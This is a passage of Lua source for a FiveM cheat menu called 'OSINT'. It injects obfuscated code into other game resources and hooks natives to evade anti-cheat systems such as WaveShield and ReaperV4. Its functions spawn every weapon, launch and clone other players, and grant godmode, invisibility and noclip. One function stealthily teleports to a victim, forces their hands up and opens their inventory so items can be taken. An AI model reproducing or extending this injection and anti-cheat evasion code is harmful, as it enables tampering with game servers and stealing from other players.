                "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_PUMPSHOTGUN",
                "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2",
                "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN",
                "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_PETROLCAN", "WEAPON_HAZARDCAN",
                "WEAPON_FERTILIZERCAN", "WEAPON_FLAREGUN", "WEAPON_BALL", "WEAPON_KNUCKLE", "WEAPON_HATCHET",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM"
            }
            
            local ped = _g(_b("PlayerPedId"))()
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if _g(_b("HasPedGotWeapon"))(ped, weaponHash, false) then
                    _G.originalWeapons[weaponHash] = _g(_b("GetAmmoInPedWeapon"))(ped, weaponHash)
                end
            end
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
            end
            
            _g(_b("SetCurrentPedWeapon"))(ped, _g(_b("GetHashKey"))("WEAPON_UNARMED"), true)
        end
    ]])
end

function OSINT:RemoveAllWeapons()
    Injection(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        if _G.allWeaponsGiven then
            _G.allWeaponsGiven = false
            
            local ped = _g(_b("PlayerPedId"))()
            
            _g(_b("RemoveAllPedWeapons"))(ped, true)
            
            if _G.originalWeapons then
                for weaponHash, ammo in pairs(_G.originalWeapons) do
                    if ammo > 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, ammo, false, true)
                    end
                end
            end
            
            _G.originalWeapons = {}
        end
    ]])
end

function OSINT:HandleLaunchPlayer(playerIds, radius)
    if not playerIds or #playerIds == 0 then
        return
    end

    local targetServerId = tonumber(playerIds[1])
    if not targetServerId then
        return
    end

    radius = radius or 3000.0

    local function GetPlayersInRadius(targetCoords, radius)
        local playersInRadius = {}
        local myPed = PlayerPedId()
        if not myPed then
            return playersInRadius
        end

        for i = 0, 255 do
            local player = GetPlayerFromServerId(i)
            if player and player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                local ped = GetPlayerPed(player)
                local coords = GetEntityCoords(ped)
                if coords then
                    local distance = #(targetCoords - coords)
                    if distance <= radius then
                        table.insert(playersInRadius, { player = player, serverId = i })
                    end
                end
            end
        end
        return playersInRadius
    end

    CreateThread(function()
        local clientId = GetPlayerFromServerId(targetServerId)
        if not clientId or clientId == -1 then
            return
        end

        local targetPed = GetPlayerPed(clientId)
        if not targetPed or not DoesEntityExist(targetPed) then
            return
        end

        local myPed = PlayerPedId()
        if not myPed then
            return
        end

        local myCoords = GetEntityCoords(myPed)
        local targetCoords = GetEntityCoords(targetPed)
        if not myCoords or not targetCoords then
            return
        end

        local distance = #(myCoords - targetCoords)
        local teleported = false
        local originalCoords = nil

        if distance > 10.0 then
            originalCoords = myCoords
            local angle = math.random() * 2 * math.pi
            local radiusOffset = math.random(5, 9)
            local xOffset = math.cos(angle) * radiusOffset
            local yOffset = math.sin(angle) * radiusOffset
            local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
            SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
            SetEntityVisible(myPed, false, 0)
            teleported = true
            Wait(100)
        end

        local playersInRadius = GetPlayersInRadius(targetCoords, radius)
        if #playersInRadius == 0 then
        end

        ClearPedTasksImmediately(myPed)
        for i = 1, 15 do
            if not DoesEntityExist(targetPed) then
                break
            end

            local curTargetCoords = GetEntityCoords(targetPed)
            if not curTargetCoords then
                break
            end

            SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
            Wait(50)
            AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
            Wait(50)
            DetachEntity(myPed, true, true)
            Wait(100)
        end

        Wait(500)
        ClearPedTasksImmediately(myPed)

        if originalCoords then
            SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false, false)
            Wait(100)
            SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
        end

        if teleported then
            SetEntityVisible(myPed, true, 0)
        end
    end)
end

function OSINT:HandleClonePlayer(playerIds)
    if not playerIds or #playerIds == 0 then return end

    local playerIdsStr = table.concat(playerIds, ",")
    MachoInjectResourceRaw("any", string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]], playerIdsStr))
end

function OSINT:HandleTakeInventory(playerIds)
    if not playerIds or #playerIds == 0 then return end
    local targetServerId = tonumber(playerIds[1])
    if not targetServerId then return end

    print("Take Inventory action executed for players: " .. table.concat(playerIds, ", "))

    local WaveDihStarted = GetResourceState("WaveShield") == 'started'

    if WaveDihStarted then
    MachoInjectResourceRaw("ox_inventory", string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end

        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            for _, pid in ipairs(players) do
                if _g(_b("GetPlayerServerId"))(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
            local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
            local me = _g(_b("PlayerPedId"))()
            local originalPos = _g(_b("GetEntityCoords"))(me)
            local wasVisible = _g(_b("IsEntityVisible"))(me)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityInvincible"))(me, true)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("FreezeEntityPosition"))(me, true)
            _w(0)
            local dest = getSafeNearbyCoord(entity)
            if _g(_b("IsPedInAnyVehicle"))(me, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(me, false)
            _g(_b("SetEntityCollision"))(me, true, true)
            _g(_b("SetEntityInvincible"))(me, false)
            _g(_b("SetEntityVisible"))(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            _g(_b("FreezeEntityPosition"))(entity, true)
            if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            _g(_b("RequestAnimDict"))(animDict)
            while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
            _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        -- === ONLY CHANGE: NO CreateThread ===
        local co = coroutine.create(function()
            _w(100)
            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
            if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                local me = _g(_b("PlayerPedId"))()
                local originalPos = stealthTeleportToEntity(targetPed)
                _w(100)
                forceHandsUp(targetPed)
                _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                _w(100)
                restoreOriginalPosition(me, originalPos)
            end
        end)
        while coroutine.status(co) ~= "dead" do
            local ok, err = coroutine.resume(co)
            if not ok then print("OSINT Coroutine error:", err); break end
            _w(0)
        end
    ]], targetServerId))
    else
    MachoInjectResource2(NewThreadNs, "ox_inventory", string.format([[
        local function findClientIdByServerId(sid)
            local players = GetActivePlayers()
            for _, pid in ipairs(players) do
                if GetPlayerServerId(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
            local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not DoesEntityExist(entity) then return nil end
            local me = PlayerPedId()
            local originalPos = GetEntityCoords(me)
            local wasVisible = IsEntityVisible(me)
            SetEntityVisible(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityCollision(me, false, false)
            FreezeEntityPosition(me, true)
            Citizen.Wait(0)
            local dest = getSafeNearbyCoord(entity)
            if IsPedInAnyVehicle(me, false) then
                local veh = GetVehiclePedIsIn(me, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(me, false)
            SetEntityCollision(me, true, true)
            SetEntityInvincible(me, false)
            SetEntityVisible(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            FreezeEntityPosition(entity, true)
            if IsPedInAnyVehicle(entity, false) then
                local veh = GetVehiclePedIsIn(entity, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
            TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and GetPlayerPed(clientId) or nil
        if targetPed and DoesEntityExist(targetPed) then
            local me = PlayerPedId()
            local originalPos = stealthTeleportToEntity(targetPed)
            Citizen.Wait(100)
            forceHandsUp(targetPed)
            TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
            Citizen.Wait(100)
            restoreOriginalPosition(me, originalPos)
        end
    ]], targetServerId))
    end
end

function OSINT:BuildMenuFromWeaponList(categoryWeapons)
    local menuValues = {}

    for _, model in ipairs(categoryWeapons) do
        if WeaponList[model] then
            menuValues[#menuValues + 1] = WeaponList[model].label
        end
    end

    return menuValues
end

function OSINT:GetWeaponModelFromLabel(modelLabel)
    for model, data in pairs(WeaponList) do
        if data.label == modelLabel then
            return model
        end
    end

    return ""
end

function OSINT:RepairVehicle()
    Injection(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        local ped = _g(_b("PlayerPedId"))()
        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
        
        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
            _g(_b("SetVehicleFixed"))(vehicle)
            _g(_b("SetVehicleDeformationFixed"))(vehicle)
            _g(_b("SetVehicleUndriveable"))(vehicle, false)
            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
        end
    ]])
end

local reaperActive = GetResourceState("ReaperV4") == "started"
local WaveActive = GetResourceState("WaveShield") == "started"
local qbJail = GetResourceState("qb-jail") == "started"

function OSINT:BuildDefaultMenu()
    ActiveMenu = {
        {
            label = "Self",
            type = "subMenu",
            categories = {
                {
                    label = "Player",
                    tabs = {
                        { type = "button", label = "Revive", desc = "This will attempt to revive you by script.",
                            onSelect = function()
                                local Actions = {
                                    ["amigo"] = function()
                                        Injection("amigo", [[ respawnPlayer() ]])
                                    end,

                                    ["TrappinBridge"] = function()
                                        Injection("new", [[ LocalPlayer.state:set('isDead', false, true) ]])
                                    end,

                                    ["rzrp-base"] = function()
                                    MachoInjectResource2(AsThreadNs, "rzrp-base", [[
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) then
                                            local coords = GetEntityCoords(ped)
                                            local heading = GetEntityHeading(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                            SetEntityHealth(ped, 200)
                                            ClearPedBloodDamage(ped)
                                            ClearPedTasksImmediately(ped)
                                            SetPlayerInvincible(PlayerId(), false)
                                            SetEntityInvincible(ped, false)
                                            SetPedCanRagdoll(ped, true)
                                            SetPedCanRagdollFromPlayerImpact(ped, true)
                                            SetPedRagdollOnCollision(ped, true)
                                        end
                                    ]])
                                    end,
                                    
                                    ["FiveStar"] = function()
                                    MachoInjectResourceRaw("FiveStar", [[
                                    if not _G.OSINT then
                                            _G.OSINT = {
                                                TEvent = function(...) end,
                                                TSEvent = function(...) end
                                            }
                                        end

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                print(("^7[^5OSINT^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("TriggerEvent", function(originalFn, eName, ...)
                                            _G.OSINT.TEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                            _G.OSINT.TSEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        _G.OSINT.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                        _G.OSINT.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(1000)
                                            _G.OSINT.TSEvent('revive:Player:Dead')
                                        end)
                                    ]])
                                    end,

                                    ["scripts"] = function()
                                        if GetResourceState("scripts") == 'started' then
                                            if WaveActive then
                                                TriggerEvent('deathscreen:revive')
                                            else
                                                if reaperActive then
                                                    MachoInjectThread(0, "scripts", "", [[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]])
                                                else
                                                    TriggerEvent('deathscreen:revive')
                                                end
                                            end
                                        end
                                    end,

                                    ["framework"] = function()
                                        if GetResourceState("framework") == 'started' then
                                            if WaveActive then
                                                TriggerEvent('deathscreen:revive')
                                            else
                                                if reaperActive then
                                                    MachoInjectThread(0, "framework", "", [[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]])
                                                else
                                                    TriggerEvent('deathscreen:revive')
                                                end
                                            end
                                        end
                                    end,

                                    ["qb-jail"] = function()
                                        if qbJail then
                                            if reaperActive then
                                                MachoInjectThread(0, "scripts", "", [[
                                                    TriggerEvent('hospital:client:Revive')
                                                ]])
                                            else    
                                                TriggerEvent('hospital:client:Revive')
                                            end
                                        end
                                    end,

                                    ["wasabi_ambulance"] = function()
                                        print('2')
                                    local WaveShit = GetResourceState("WaveShield") == "started"
                                    local ReaperV4Shit = GetResourceState("ReaperV4") == "started"

                                    if WaveShit then
                                    MachoInjectResourceRaw("wasabi_ambulance", [[
                                    if not _G.OSINT then
                                        _G.OSINT = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5OSINT^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.OSINT.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.OSINT.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.OSINT.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.OSINT.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.OSINT.TEvent("esx:onPlayerSpawn")
                                        _G.OSINT.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]])
                                    else
                                    if ReaperV4Shit then
                                    MachoInjectThread(0, "wasabi_ambulance", "", [[
                                    if not _G.OSINT then
                                        _G.OSINT = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5OSINT^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.OSINT.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.OSINT.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.OSINT.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.OSINT.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.OSINT.TEvent("esx:onPlayerSpawn")
                                        _G.OSINT.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]])
                                    else
                                    MachoInjectResourceRaw("wasabi_ambulance", [[
                                    if not _G.OSINT then
                                        _G.OSINT = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5OSINT^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.OSINT.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.OSINT.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.OSINT.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.OSINT.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.OSINT.TEvent("esx:onPlayerSpawn")
                                        _G.OSINT.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]])                                    
                                    end     
                                end                               
                            end,

                                    ["mc9-medicsystem"] = function()
                                        print('1')
                                    local WaveShit = GetResourceState("WaveShield") == "started"
                                    local ReaperV4Shit = GetResourceState("ReaperV4") == "started"
                                    
                                    if WaveShit then
                                    MachoInjectResourceRaw("mc9-medicsystem", [[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]])
                                    else
                                    if ReaperV4Shit then
                                    MachoInjectThread(0, "mc9-medicsystem", "", [[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]])
                                else
                                    MachoInjectResourceRaw("mc9-medicsystem", [[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]])
                                    end
                                end
                            end,
                        }

                                for resourceName, execution in pairs(Actions) do
                                    if GetResourceState(resourceName) == "started" then
                                        execution()
                                    end
                                end
                            end
                        },

                        { type = "slider", label = "Health", desc = "This will set your health to the desired amount.", scrollType = "onEnter", value = 100, min = 0, max = 100, step = 1.0,
                            onSelect = function(value)
                                SetEntityHealth(PlayerPedId(), value + 100.0)
                            end
                        },
                        { type = "slider", label = "Armour", desc = "This will set your armour to the desired amount.", scrollType = "onEnter", value = 100, min = 0, max = 100, step = 1.0,
                            onSelect = function(value)
                                SetPedArmour(PlayerPedId(), value)
                            end
                        },
                        { type = "button", label = "Refill Health", desc = "This will refill your health to the maximum value.",
                            onSelect = function()
                                SetEntityHealth(PlayerPedId(), GetEntityMaxHealth(PlayerPedId()))
                            end
                        },
                        { type = "button", label = "Refill Armour", desc = "This will refill your armour to the maximum value.",
                            onSelect = function()
                                SetPedArmour(PlayerPedId(), 100)
                            end
                        },
                        { type = "checkbox", label = "Godmode", checked = false, desc = "This will give your player godmode.",
                            onSelect = function(checked)
                                self:HandleGodmodeToggle(checked)
                            end
                        },
                        {
                            type = "checkbox", 
                            label = "Invisibility", 
                            checked = false, 
                            desc = "This will make your player invisible.",
                            onSelect = function(checked)
                                if checked then
                                    self:EnableInvisibility()
                                else
                                    self:DisableInvisibility()
                                end
                            end
                        },
                        { type = "divider", label = "Movement" },
                        {
                            type = "slider-checkbox",
                            label = "Noclip",
                            scrollType = "onScroll",
                            checked = false,
                            value = 0.25,
                            step = 0.25,
                            min = 0.25,
                            max = 5.0,
                            onSelect = function(sliderValue, checked)
                                if checked then
                                    if not FirstInjectionPassed then
                                        OSINT:Notify("info", "OSINT", "Initializing... Please wait!", 1000)
                                        Wait(400)
                                        FirstInjectionPassed = true
                                    end

                        if GetResourceState("WaveShield") == "started" then
                            MachoInjectResourceRaw(
                                GetResourceState("monitor") == "started" and "monitor"
                                or GetResourceState("ox_lib") == "started" and "ox_lib"
                                or "any",
                                [[
                                _G.OSINTNoclipSpeed = ]] .. sliderValue .. [[
                                if not _G.OSINTNoclipThreadRunning then
                                    _G.OSINTNoclipEnabled = true
                                    _G.OSINTNoclipThreadRunning = true

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                    hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        -- iterative, non-recursive executor to avoid stack growth
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        while _G.OSINTNoclipThreadRunning do
                                            Wait(0)
                                            if not _G.OSINTNoclipEnabled then
                                                Wait(500)
                                                goto continue
                                            end

                                            local ped = GetPlayerPed(-1)
                                            if not DoesEntityExist(ped) then goto continue end

                                            local vehicle = GetVehiclePedIsIn(ped, false)
                                            local entity = (vehicle ~= 0 and vehicle) or ped
                                            if not DoesEntityExist(entity) then goto continue end

                                            local coords = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            -- convert once and reuse
                                            local radH = heading * math.pi / 180.0
                                            local radP = pitch * math.pi / 180.0

                                            local dx = -math.sin(radH)
                                            local dy = math.cos(radH)
                                            local dz = math.sin(radP)
                                            local len = math.sqrt(dx*dx + dy*dy + dz*dz)
                                            if len ~= 0 then
                                                dx = dx / len
                                                dy = dy / len
                                                dz = dz / len
                                            end

                                            local speed = _G.OSINTNoclipSpeed or 0.25
                                            -- cache control checks to avoid repeating native calls
                                            local sprint = IsControlPressed(0, 21)
